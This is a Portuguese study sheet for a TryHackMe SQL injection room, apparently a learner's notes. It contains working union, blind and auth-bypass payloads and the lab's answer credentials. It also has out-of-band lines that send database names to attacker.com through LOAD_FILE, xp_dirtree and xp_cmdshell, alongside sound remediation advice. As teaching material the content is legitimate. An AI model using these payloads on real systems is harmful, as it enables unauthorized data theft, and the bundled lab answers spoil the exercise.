# 🛡️ Resumão SQL Injection Introduction — Anotações TryHackMe

> Sala do módulo **Web Application Vulnerabilities I**. Cobre SQLi de ponta a ponta: sintaxe, detecção, In-Band (Error/Union), Blind (Auth Bypass, Boolean, Time-Based), Out-of-Band e remediação. OWASP **A05:2025 - Injection**.
>
> 📋 **Este arquivo serve de guia de consulta para o lab prático (Task 9) — payloads prontos em cada nível.**
>
> ⚠️ **Use apenas em laboratórios (TryHackMe, HackTheBox, PortSwigger Academy, VMs próprias) ou em sistemas para os quais você tenha autorização por escrito.**

---

## 📑 Índice

1. [O que é SQLi](#1-o-que-é-sqli)
2. [Kit de sintaxe (building blocks)](#2-kit-de-sintaxe-building-blocks)
3. [Detecção](#3-detecção)
4. [As 3 famílias de SQLi](#4-as-3-famílias-de-sqli)
5. [Union-Based: método dos 6 passos](#5-union-based-método-dos-6-passos)
6. [Authentication Bypass](#6-authentication-bypass)
7. [Boolean-Based Blind](#7-boolean-based-blind)
8. [Time-Based Blind](#8-time-based-blind)
9. [Out-of-Band](#9-out-of-band)
10. [🎯 Lab prático — payloads por nível](#10--lab-prático--payloads-por-nível)
11. [Remediação](#11-remediação)
12. [Erros comuns](#12-erros-comuns)

---

## 1. O que é SQLi

A aplicação joga o input do usuário **direto na query SQL** sem sanitização, então o input vira **código SQL** em vez de **dado**.

```php
// A RAIZ DA FALHA: concatenação
$query = "SELECT * FROM articles WHERE id = " . $_GET['id'] . " AND public = 1;";
```

Mandando `?id=1 OR 1=1-- `:
```sql
SELECT * FROM articles WHERE id = 1 OR 1=1-- AND public = 1;
```
- `OR 1=1` → WHERE sempre verdadeiro
- `-- ` → comenta o resto
- Resultado: devolve **todos os registros**, inclusive privados.

---

## 2. Kit de sintaxe (building blocks)

| Recurso | Sintaxe (MySQL) | Para que serve |
|---|---|---|
| **Comentário linha** | `-- ` (com espaço!) ou `#` | Cortar o resto da query |
| **Comentário bloco** | `/* */` | Idem, multi-linha |
| **UNION** | `UNION SELECT ...` | Colar um SELECT seu (mesmo nº de colunas!) |
| **LIKE + wildcard** | `LIKE 'a%'` (`%`=qualquer, `_`=1 char) | Extração caractere a caractere (Blind) |
| **LIMIT** | `LIMIT 1` / `LIMIT 2,1` | Controlar qual/quantas linhas |
| **group_concat()** | `group_concat(col SEPARATOR '<br>')` | Juntar várias linhas numa string |
| **CONCAT()** | `CONCAT(user,':',pass)` | Juntar valores de uma linha |
| **information_schema** | `.tables` / `.columns` | O "mapa" do banco (tabelas e colunas) |

**information_schema** (o mais importante):
- `information_schema.tables` → `table_schema` (banco) + `table_name` (tabela)
- `information_schema.columns` → `table_name` + `column_name`

> ⚠️ O espaço depois do `-- ` é **obrigatório** no MySQL.

---

## 3. Detecção

Teste **todo input que toca o banco:** URL, formulários (login/busca/comentário), **cookies** e **headers HTTP**.

| Teste | O que indica |
|---|---|
| `'` | Erro de banco → entra na query sem tratamento |
| `"` | Query usa aspa dupla |
| `;--` | Comportamento muda → comentário processado |
| `OR 1=1` | Muda resultados → input está na lógica |

Sem erro visível? → parte pra Boolean (conteúdo) ou Time-Based (tempo).

---

## 4. As 3 famílias de SQLi

```
A app me mostra o resultado/erro?
├─ SIM → In-Band (Union ou Error)          ← fácil, vejo tudo
└─ NÃO → A resposta muda de algum jeito?
          ├─ Conteúdo muda → Boolean-Based   ← leio por true/false
          ├─ Só o tempo muda → Time-Based    ← leio pelo relógio
          └─ Nada muda → Out-of-Band         ← outro canal (DNS/HTTP)
```

| Família | Feedback | Subtipos |
|---|---|---|
| **In-Band** | Direto na página | Error-Based · Union-Based |
| **Blind** | Sinal indireto | Auth Bypass · Boolean · Time-Based |
| **Out-of-Band** | Outro canal (DNS/HTTP) | — |

**Sempre tente de cima pra baixo.** A técnica mais chata é pra quando o alvo te deu menos informação.

---

## 5. Union-Based: método dos 6 passos

| Passo | Payload | O que faz |
|---|---|---|
| 1. Nº colunas | `1 UNION SELECT 1` → `1,2` → `1,2,3`... | Incrementa até o erro sumir |
| 2. Colunas visíveis | `0 UNION SELECT 1,2,3` | ID=0 zera a query; os nº na tela = colunas usáveis |
| 3. Nome do banco | `0 UNION SELECT 1,2,database()` | — |
| 4. Tabelas | `0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema='banco'` | — |
| 5. Colunas | `0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name='tabela'` | — |
| 6. Dados | `0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM tabela` | — |

**Por quê:** nº de colunas tem que bater (regra do UNION); ID=0/-1 força query original vazia; information_schema é o catálogo do banco.

---

## 6. Authentication Bypass

Query de login: `SELECT * FROM users WHERE username='X' AND password='Y' LIMIT 1;`
A app só checa: **voltou linha?** Sim = entra.

| Payload | Quando |
|---|---|
| `' OR 1=1;-- ` | Clássico (aspa simples), loga como 1º usuário |
| `admin'-- ` | Loga como **admin específico** (comenta a senha) |
| `' OR 1=1#` | `#` como comentário |
| `" OR 1=1-- ` | Query com aspa dupla |

**A anatomia do payload** (3 partes):
1. `'` → **fecha a aspa** (sai da string)
2. `OR 1=1` → **condição sempre-verdadeira** (ou nenhuma, se usar `admin'--`)
3. `-- ` → **comenta o resto**

> `1=1` não é mágico — `OR 2>1`, `OR 'a'='a'` servem igual.
> Contexto **numérico** (sem aspa): injeta direto `1 OR 1=1`.

---

## 7. Boolean-Based Blind

A app devolve dois estados (`{"taken":true/false}`, conteúdo A/B). Você faz perguntas sim/não e lê pelo **conteúdo**.

```
Confirmar: admin123' UNION SELECT 1,2,3 WHERE database() LIKE '%';-- 
Banco:     ... WHERE database() LIKE 'a%';--   (false)
           ... WHERE database() LIKE 's%';--   (true → 1ª letra é 's')
           ... LIKE 'sq%';--  ... até o nome completo
```
Mesma técnica no `information_schema` pra tabelas/colunas, depois nos dados.

---

## 8. Time-Based Blind

A app é **idêntica** faça o que fizer. Único sinal = **tempo** (`SLEEP()`).

```
Nº colunas: admin123' UNION SELECT SLEEP(5);--      (sem delay = errado)
            admin123' UNION SELECT SLEEP(5),2;--    (5s = 2 colunas)
Banco:      admin123' UNION SELECT SLEEP(5),2 WHERE database() LIKE 's%';--
            → demorou 5s = true
```
Demora = true. Imediato = false. **MSSQL:** `WAITFOR DELAY '0:0:5'`.

> ⚠️ Latência de rede engana. Use sleeps de 5-10s e teste cada caractere 2x.

---

## 9. Out-of-Band

Força o **banco a conectar no seu servidor** (DNS/HTTP) com o dado embutido. Último recurso, quando nada mais funciona **e** o banco tem saída de rede.

**MySQL (Windows):**
```sql
SELECT LOAD_FILE(CONCAT('\\\\', (SELECT database()), '.attacker.com\\share'));
```
→ dispara DNS lookup de `banco.attacker.com`; seu servidor loga o subdomínio.

**MSSQL:**
```sql
EXEC master..xp_dirtree '\\attacker.com\share';     -- dispara DNS (ativo por padrão)
EXEC xp_cmdshell 'nslookup data.attacker.com';      -- desativado por padrão
```

**Receber:** Burp Collaborator (Pro), Interactsh (grátis), listener próprio.
**Limites:** banco precisa de saída; payload por engine; subdomínio ≤ 63 chars; lento.

---

## 10. 🎯 Lab prático — payloads por nível

> Lab: `http://MACHINE_IP/levelN`. Níveis sequenciais, flag no topo do próximo. **502? espere e recarregue.** Use a **SQL Query box ao vivo**.

### Level 1 — Union-Based (banco: `sqli_one`, tabela: `staff_users`)
Cole no campo `id` da URL, um por vez:
```
1 UNION SELECT 1,2,3
0 UNION SELECT 1,2,3
0 UNION SELECT 1,2,database()
0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'
0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'
0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users
```
→ **Pegue a senha do Martin**, cole no Answer box → Check Password.

### Level 2 — Authentication Bypass
- **Username:** `' OR 1=1;-- `
- **Password:** qualquer coisa
→ Login → flag.

### Level 3 — Boolean-Based (banco: `sqli_three`, tabela: `users`, cred: `admin` / `3845`)
```
admin123' UNION SELECT 1,2,3 where database() like '%';--          (confirma = true)
admin123' UNION SELECT 1,2,3 where database() like 's%';--         (banco letra a letra)
admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like 'u%';--
admin123' UNION SELECT 1,2,3 FROM information_schema.columns WHERE table_name = 'users' and column_name like 'u%';--
admin123' UNION SELECT 1,2,3 from users where username like 'a%';--
admin123' UNION SELECT 1,2,3 from users where username='admin' and password like '3%';--
```
→ Login `admin` / `3845` → flag.

### Level 4 — Time-Based (banco: `sqli_four`, cred: `admin` / `4961`)
> ⚠️ **Injeção no header `Referer`**, não num campo! Use o **Burp Repeater** pra editar o Referer e **cronometrar** a resposta. A extensão **Request Timer** ajuda a medir.
```
admin123' UNION SELECT SLEEP(5);--          (sem delay = errado)
admin123' UNION SELECT SLEEP(5),2;--        (5s = 2 colunas)
admin123' UNION SELECT SLEEP(5),2 where database() like 's%';--
admin123' UNION SELECT SLEEP(5),2 FROM information_schema.tables WHERE table_schema = 'sqli_four' and table_name like 'u%';--
admin123' UNION SELECT SLEEP(3),2 from users where username='admin' and password like '4%';--
```
→ Login `admin` / `4961` → flag final.

> **A lição do Nível 4:** você extraiu uma senha inteira **sem a app devolver 1 byte de dado**. Cada dígito veio de "demorou 3s ou não?". No mundo real isso se automatiza com **SQLmap** — mas fazer na mão 1x mostra por que funciona e onde quebra.

---

## 11. Remediação

| Defesa | O que faz | Nível |
|---|---|---|
| **Prepared Statements** | Separa código de dado (placeholders `?`/`:param`) | **A CURA** |
| **Input Validation** | Allowlist (aceita só o válido) | Reforço |
| **Escaping** | `\` antes de especiais | Último recurso (legado) |
| **Least Privilege** | Conta de banco com o mínimo (só SELECT) | Limita o dano |
| **WAF** | Bloqueia padrões conhecidos | Camada extra |

```php
// VULNERÁVEL
$query = "SELECT * FROM users WHERE username='" . $_POST['username'] . "'";

// CORRIGIDO (PDO)
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ?");
$stmt->execute([$_POST['username']]);
```

**Em Delphi/Firebird** (o teu caso):
```pascal
// VULNERÁVEL
Query.SQL.Text := 'SELECT * FROM users WHERE username = ''' + edUser.Text + '''';

// CORRIGIDO
Query.SQL.Text := 'SELECT * FROM users WHERE username = :user';
Query.ParamByName('user').AsString := edUser.Text;
```

> Só o **prepared statement** ataca a causa raiz. O resto é mitigação (reduz dano/dificulta), não cura.

---

## 12. Erros comuns

- ❌ Esquecer o **espaço** depois do `-- ` (MySQL).
- ❌ Usar `'` quando a query usa `"` (ou vice-versa) → payload não fecha a aspa.
- ❌ Mandar `' OR 1=1` em contexto **numérico** (sem aspa) → erro de sintaxe; use `1 OR 1=1`.
- ❌ Errar o nº de colunas no UNION → erro (a contagem tem que bater).
- ❌ Esquecer o ID=0/-1 no Union → a linha real some sua injeção.
- ❌ No Time-Based, confiar em 1 teste → latência engana; repita e use sleeps longos.
- ❌ No Nível 4, procurar a injeção num campo visível → é no **header Referer**.
- ❌ Confiar só em WAF ou validação → não é cura, prepared statement é.
- ❌ Testar sites sem autorização.

---

*Módulo: Web Application Vulnerabilities I — SQL Injection Introduction.*
